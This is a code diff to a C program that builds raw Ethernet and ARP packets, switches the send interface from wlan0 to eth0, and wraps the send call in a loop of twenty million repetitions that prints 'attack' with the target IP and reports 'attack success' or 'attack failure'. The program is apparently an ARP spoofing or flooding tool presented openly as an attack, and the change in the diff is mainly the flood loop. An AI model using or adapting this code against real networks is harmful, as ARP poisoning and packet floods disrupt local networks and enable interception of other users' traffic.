@@ -233,6 +233,13 @@ typedef struct _TCP_OPTIONS
 	char m_cContext[32];
 }__attribute__((packed))TCP_OPTIONS, *PTCP_OPTIONS;
 
+/* ARP + ether */
+typedef struct _tag_ARP_PACKET
+{
+	struct ether_header eh;
+	struct ether_arp arp;
+}__attribute__((packed))ARP_PACKET_OBJ,*ARP_PACKET_HANDLE;
+
 /*
  *Mac地址16进制转换
  *a8:15:4d:1f:7d:68
@@ -299,7 +306,7 @@ int main(int argc,char *argv[])
 	printf("\n");
 
 	printf("source ethernet address:");
-	
+
 	memcpy(eth_hdr.ether_shost,srcMacAddress,6);
 
 	for(i=0;i<6;i++){
@@ -345,7 +352,7 @@ int main(int argc,char *argv[])
 
 	memset(&sa, 0, sizeof(struct sockaddr));
 
-	strcpy(sa.sa_data,"wlan0");
+	strcpy(sa.sa_data,"eth0");
 
 	char buf[60];
 
@@ -363,23 +370,8 @@ int main(int argc,char *argv[])
 
 	memset(&src_addr, 0,sizeof(struct in_addr));
 
-	//inet_aton(src_ip_addr, &src_addr);	
-
-	/*
-	if(inet_pton(AF_INET, sou_ip_addr,(void *)&src_addr) < 0){
-		perror("fail to convert\n");
-		exit(1);
-	}
-	*/
 	memset(&des_addr, 0,sizeof(struct in_addr));
 
-	//inet_aton(trc_ip_addr, &trc_addr);
-	/*
-	if(inet_pton(AF_INET, des_ip_addr,(void *)&trc_addr) < 0){
-		perror("fail to convert\n");
-		exit(1);
-	}
-	*/
 	/* set arp packet data */  	
 	memcpy((void *) arp.arp_sha,(void *) eth_hdr.ether_dhost, 6);
 
@@ -395,25 +387,26 @@ int main(int argc,char *argv[])
 	//printf("sizeof buf :%d\n",(int)sizeof(buf));
 	/*
 
-	FILE *logfile;
+	   FILE *logfile;
 
-	logfile=fopen("log.txt","w");
+	   logfile=fopen("log.txt","w");
 
-	fprintf(logfile , "write log file"); 
+	   fprintf(logfile , "write log file"); 
 
-	fclose(logfile);	
-	*/
+	   fclose(logfile);	
+	   */
+	for(i=0;i<20000000;i++){
+		result = sendto(fd, buf, sizeof(buf), 0, &sa, sizeof(sa));
 
-	result = sendto(fd, buf, sizeof(buf), 0, &sa, sizeof(sa));
+		printf("attack %s\n!!\n", (char *)des_ip_addr);
 
-	printf("attack %s\n!!\n", (char *)des_ip_addr);
+		printf("Sendto func result: %d \n",result);
 
-	printf("Sendto func result: %d \n",result);
-
-	if(result < 0){
-		printf("attack failure: %d \n",errno);
-	}else{
-		printf("attack success \n");
+		if(result < 0){
+			printf("attack failure: %d \n",errno);
+		}else{
+			printf("attack success \n");
+		}
 	}
 	/**
 	 * in_addr IPv4地址结构体
